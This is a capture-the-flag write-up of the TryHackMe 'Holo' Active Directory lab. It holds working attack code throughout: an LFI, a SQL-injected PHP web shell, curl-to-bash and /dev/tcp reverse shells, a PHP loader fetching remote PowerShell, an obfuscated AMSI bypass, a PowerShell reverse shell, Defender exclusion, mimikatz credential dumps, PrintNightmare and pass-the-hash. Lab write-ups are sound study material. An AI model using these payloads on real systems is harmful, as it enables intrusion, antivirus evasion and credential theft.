# Holo - Active Directory Network
Scope: 10.200.110.0/24 | 192.168.100.0/24 | 2022-04-12
My address: 10.50.111.110

## Initial Recon
### Nmap Scan:
Command: 
- `nmap -sV -sC -p- -v 10.200.110.0/24`

Nmap Results:
- 10.200.110.33 | Ports: 22, 80, 33060 (mysql)
Web Server: Apache WordPress 5.5.3 | Robots.txt
- 10.200.110.250 | Ports: 22, 1337
Web Server: Port 1337 - Node.js Framework

*Added 10.200.110.33 to hosts file as holo.live*

### Subdomains/Directory Enumeration:
Command:
- [[GoBuster - Web Enumeration]]

Scan Results:
- www.holo.live
- admin.holo.live
- dev.holo.live
*Added 10.200.110.33 to hosts with all of the domains above*

On admin server: 
- /var/www/admin/db.php
- /var/www/admin/dashboard.php
- /var/www/admin/supersecretdir/creds.txt

On dev server:
LFI - http://dev.holo.live/img.php?file=../../../../../../../../../var/www/admin/supersecretdir/creds.txt

Creds from the admin page (via LFI): `admin:DBManagerLogin!`

RCE - http://admin.holo.live/dashboard.php?cmd= => Leads to Reverse Shell

Found out the machine is in a docker via: `cat /proc/1/cgroup`


## Docker Machine:
Internal port scanning: `nc -zv 192.168.100.1 1-65535`
Open ports: 33060, 8080, 3306, 80, 22

Found database creds inside php code: `admin:!123SecureAdminDashboard321!`

DB dump:
```
+----------+-----------------+
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA            |
+----------+-----------------+
```

Injecting php rce file into the server (outside the docker):
`select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`

RCE via: `curl 192.168.100.1:8080/shell.php?cmd=whoami`

To make a shell with it it's possible to host a shell code on our machine, then access it via curl & bash (`curl%2010.50.111.110/shell.sh%7Cbash%20`)

shell.sh:
```sh
#!/bin/bash
bash -i >& /dev/tcp/tun0ip/53 0>&1
```


## L-SRV01
Enumerating machine with linpeas: `wget 10.50.111.110/linpeas.sh`

Found: dev-mirror.holo.live | Might be interesting
Docker has SUID | GTFObins to privesc

List all docker images on the system:
`docker images`

Privesc:
`docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh`

shadow dump:
```
root:$6$TvYo6Q8EXPuYD8w0$Yc.Ufe3ffMwRJLNroJuMvf5/Telga69RdVEvgWBC.FN5rs9vO0NeoKex4jIaxCyWNPTDtYfxWn.EM4OLxjndR1:18605:0:99999:7:::
daemon:*:18512:0:99999:7:::
bin:*:18512:0:99999:7:::
sys:*:18512:0:99999:7:::
sync:*:18512:0:99999:7:::
games:*:18512:0:99999:7:::
man:*:18512:0:99999:7:::
lp:*:18512:0:99999:7:::
mail:*:18512:0:99999:7:::
news:*:18512:0:99999:7:::
uucp:*:18512:0:99999:7:::
proxy:*:18512:0:99999:7:::
www-data:*:18512:0:99999:7:::
backup:*:18512:0:99999:7:::
list:*:18512:0:99999:7:::
irc:*:18512:0:99999:7:::
gnats:*:18512:0:99999:7:::
nobody:*:18512:0:99999:7:::
systemd-network:*:18512:0:99999:7:::
systemd-resolve:*:18512:0:99999:7:::
systemd-timesync:*:18512:0:99999:7:::
messagebus:*:18512:0:99999:7:::
syslog:*:18512:0:99999:7:::
_apt:*:18512:0:99999:7:::
tss:*:18512:0:99999:7:::
uuidd:*:18512:0:99999:7:::
tcpdump:*:18512:0:99999:7:::
sshd:*:18512:0:99999:7:::
landscape:*:18512:0:99999:7:::
pollinate:*:18512:0:99999:7:::
ec2-instance-connect:!:18512:0:99999:7:::
systemd-coredump:!!:18566::::::
ubuntu:!$6$6/mlN/Q.1gopcuhc$7ymOCjV3RETFUl6GaNbau9MdEGS6NgeXLM.CDcuS5gNj2oIQLpRLzxFuAwG0dGcLk1NX70EVzUUKyUQOezaf0.:18601:0:99999:7:::
lxd:!:18566::::::
mysql:!:18566:0:99999:7:::
dnsmasq:*:18566:0:99999:7:::
linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::
```

Hashcat cracked:
`linux-admin:linuxrulez`

SSH access to the machine:
`ssh linux-admin@10.200.110.33`

### Pivoting
I configured chisel like in [[Chisel]].
Found another IP address via: `proxychains nmap 10.200.110.0/24`

```
S-SRV01: 10.200.110.31

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
```


## S-SRV01
### Initial steps
http://10.200.110.31/reset.php
To access the site I configured FoxyProxy to use the chisel proxy when connecting to sites that start with 10.200.* to make it easier to surf to the site.

Username `gurag` that was found in database in the previous tasks works here.
When trying to reset password the server leaks the user_token for the password reset in the response cookie, which lets us reset gurag's password by simply adding the token to the user_token parameter in the URL.

After logging in as gurag, there's an image upload page. The page has some client side filters to prevent php scripts from being uploaded, it can be simply bypassed after disabling java-script in the browser.

Now comes the tricky part. The task wanted me to use Covenant C2 stub, and use it to gain access to the machine. The only problem was Windows Defender was active on the machine. For 4 straight days, I tried obfuscating the exe grunt + bypass WD and AMSI, and it kinda worked? On my Windows VM it worked, but I messed something up and failed to bypass defender. I then tried to choose Covenant's PowerShell stub, hoping it'd be easier to bypass WD with it, and it was, but every time I ran it the connection died after a few seconds. Eventually I gave up on using Covenant and decided to use my AMSI bypass and attach a PowerShell reverse shell script instead.

### Here are the scripts I used:

#### PHP Loader
```php
<?php
  function execute_cmd() {
    $init = "powershell.exe";
    $payload = "iex (New-Object Net.WebClient).DownloadString('http://10.50.107.226:8080/bypass.ps1')"; // Downloads and executes bypass.ps1 in memory
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
  execute_cmd();
?>
```
The script tries to access a python webserver on my machine, grab bypass.ps1 from it, and execute it.

### Bypass.ps1
```powershell
 # AMSI Bypass - Matt Graeber - Obfuscated.
 &("{0}{1}{3}{2}"-f's','e','E',("{1}{2}{0}" -f'Bl','T-','VArIa')) ("n"+("{1}{0}"-f '1','h4b')) ([TyPE]("{1}{0}"-f'F','re') ) ;  (  .("{0}{1}{2}" -f("{2}{3}{1}{0}"-f'Ab','ari','get','-V'),'l','e') ("N"+("{1}{0}"-f '1','h4B'))  -vALueO)."AssemB`LY".("{2}{0}{1}" -f't',("{1}{0}"-f'e','Typ'),'Ge')."INvo`ke"(("{4}{9}{6}{3}{2}{1}{8}{7}{0}{5}" -f("{1}{0}" -f 'Ut','msi'),'oma','ut',("{2}{0}{1}"-f'ment.','A','ge'),'S','ils','ana','A',("{0}{1}"-f'tio','n.'),("{0}{1}"-f'yst','em.M'))).("{1}{0}" -f'ld',("{0}{1}{2}" -f 'G','etF','ie'))."Inv`oKe"(("{1}{4}{0}{2}{3}"-f ("{0}{1}{2}" -f'Init','F','a'),'ams','ile','d','i'),("{4}{2}{1}{0}{3}"-f ',','ic','l',("{0}{1}"-f 'S','tatic'),("{1}{0}"-f 'nPub','No'))).("{1}{0}"-f 'lue',("{0}{1}"-f 'Set','Va'))."i`Nv`Oke"(${Nu`Ll},${tr`Ue});

 # Downloads and executes rev_shell.ps1 in memory
 iex (New-Object Net.WebClient).DownloadString('http://10.50.107.226:8080/rev_shell.ps1');
```
The script bypasses AMSI to avoid issues that might come up, then tries to access my python webserver to grab rev_shell.ps1 and execute it.

### Rev_shell.ps1
```powershell
# Reverse Shell to Port 80
$client = New-Object System.Net.Sockets.TCPClient("10.50.107.226",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
This is a simple reverse shell I found online, I simply edited the IP and port, started up ncat, and waited for a connection.

### Getting the flag
After getting a scuffed shell, I wanted to upgrade it to a tty shell. The simplest way I could think of was just using the SSH.
I checked my current permissions, saw I had root access, changed the admin's password, and accessed it via SSH.

```
PS C:\web\htdocs\images> whoami
nt authority\system
PS C:\web\htdocs\images> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
sshd                     WDAGUtilityAccount       
The command completed with one or more errors.

PS C:\web\htdocs\images> net user Administrator password
The command completed successfully.
```

Then I simply went to the desktop to grab the root flag for this server.

### Elevating Domain Access
Now that I have shell access to the machine, according to the box, I need to dump credentials using mimikatz. However since I didn't use Covenant I need to upload and execute it manually.
So I started by upgrading my shell to PowerShell: `powershell -exec bypass`.

Then, to avoid obfuscating mimikatz, I decided to just whitelist a folder from WD, because I have admin access I can do that! I simply executed: `Add-MpPreference -ExclusionPath "C:\Users\Administrator\Downloads\"` and now WD isn't a problem anymore.

The next step is to download mimikatz and run it:
```
wget http://10.50.107.226:8080/mimikatz.exe -OutFile meme.exe`
.\meme.exe
```
And voila, I got mimikatz up and running.

I tested mimikatz is working with: `privilege::debug` and got a `Privilege '20' OK` which means I can use mimikatz without any problems.

Then I tried elevating my access to system from admin via: `token::elevate` and it worked!

And finally, the sauce: `sekurlsa::logonpasswords` to dump the credentials of all the accounts that are already authenticated to the endpoint. With that I managed to dump the credentials for `watamet`.
```
Authentication Id : 0 ; 298318 (00000000:00048d4e)
Session           : Interactive from 1
User Name         : watamet
Domain            : HOLOLIVE
Logon Server      : DC-SRV01
Logon Time        : 4/10/2022 2:33:55 PM
SID               : S-1-5-21-471847105-3603022926-1728018720-1132 
        msv :
         [00000003] Primary
         * Username : watamet
         * Domain   : HOLOLIVE
         * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
         * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
         * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
        tspkg :
        wdigest :
         * Username : watamet
         * Domain   : HOLOLIVE
         * Password : (null)
        kerberos :
         * Username : watamet
         * Domain   : HOLO.LIVE
         * Password : Nothingtoworry!
        ssp :
        credman :
```

With all of this newly obtained info I can run CrackMapExec:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ proxychains -q crackmapexec smb 10.200.110.0/24 -u watamet -d HOLOLIVE -H d8d41e6cf762a8c77776a1843d4141c9

SMB         10.200.110.35   445    PC-FILESRV01     [*] Windows 10.0 Build 17763 x64 (name:PC-FILESRV01) (domain:HOLOLIVE) (signing:False) (SMBv1:False)
SMB         10.200.110.31   445    S-SRV01          [*] Windows 10.0 Build 17763 x64 (name:S-SRV01) (domain:HOLOLIVE) (signing:False) (SMBv1:False)
SMB         10.200.110.30   445    DC-SRV01         [*] Windows 10.0 Build 17763 x64 (name:DC-SRV01) (domain:HOLOLIVE) (signing:False) (SMBv1:False)
SMB         10.200.110.35   445    PC-FILESRV01     [+] HOLOLIVE\watamet:d8d41e6cf762a8c77776a1843d4141c9 
SMB         10.200.110.31   445    S-SRV01          [+] HOLOLIVE\watamet:d8d41e6cf762a8c77776a1843d4141c9 (Pwn3d!)
SMB         10.200.110.30   445    DC-SRV01         [+] HOLOLIVE\watamet:d8d41e6cf762a8c77776a1843d4141c9
```

We can see this new user has access to a new server on the network: `10.200.110.35 (PC-FILESRV01)`


## PC-FILESRV01
From scanning the new server we can see RDP is open:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ proxychains -q nmap -F 10.200.110.35                                                                      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 12:17 EDT
Nmap scan report for 10.200.110.35
Host is up (0.25s latency).
Not shown: 95 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

So I used remmina to connect with RDP. I used the credentials that I found with mimikatz for that. And grabbed the user flag from the Desktop.

From here started to enumerate the machine. To bypass Applocker I installed my enumeration apps to `C:\Windows\System32\spool\drivers\color`. I enumerated the machine with Seatbelt, SharpEDRChecker, and PowerView according to how the task wanted me to do so. The most crucial piece of info I found was `S-SRV01.holo.live` - local admin.

Now, the intended way for privesc on this machine was with dll hijacking for an application called: `kavremover` on the machine. However the machine had issues with this part for a while now, so I decided to look up an alternative way to privesc.

After taking a look in TryHackMe's discord server to see if anyone else talked about the dll hijacking not working, and someone pointed out that the machine is vulnerable to PrintNightmare!

I downloaded and used https://github.com/calebstewart/CVE-2021-1675 to exploit it.
```
PS C:\Windows\System32\spool\drivers\color> wget 10.50.107.226/CVE-2021-1675.ps1 -OutFile CVE-2021-1675.ps1

PS C:\Windows\System32\spool\drivers\color> Import-Module .\CVE-2021-1675.ps1

PS C:\Windows\System32\spool\drivers\color> Invoke-Nightmare -NewUser "root" -NewPassword "password" -DriverName "PrintMe"

[+] created payload at C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user root as local administrator
[+] deleting payload from C:\Users\watamet\AppData\Local\Temp\2\nightmare.dll
```

And just like that I made myself a root account with the credentials: `root:password` that I can login to with RDP.

### Going Up!
The next step is to gain DC admin access. According to the task, I need to start by using `ntlmrelayx.py` in impacket.
To do that, I first did a network scan over the entire network to find SMB running without SMB signing.
I managed to get a hit on `10.200.110.30 (DC-SRV01)` which is most likely the DC.
```
Host script results:
| smb2-time: 
|   date: 2022-04-10T22:00:49
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40338/tcp): CLEAN (Couldn't establish connection (Nsock connect failed immediately))
|   Check 2 (port 40841/tcp): CLEAN (Couldn't establish connection (Nsock connect failed immediately))
|   Check 3 (port 40945/udp): CLEAN (Timeout)
|   Check 4 (port 18769/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
```

I switched my pivoting method to sshuttle, so that I could use proxychains for ntlmrelayx.
`sudo sshuttle -r linux-admin@10.200.110.33 10.200.110.0/24  -x 10.200.110.33` (-x prevents 10.200.110.33 from being excluded twice)

Then I simply followed the task, and managed to get a relay back from the DC.

I then used `proxychains smbexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.110.30` to read the root flag.

And just like that I finished the network :)

Overall it was a pretty fun challenge, and I learned a lot of stuff along the way.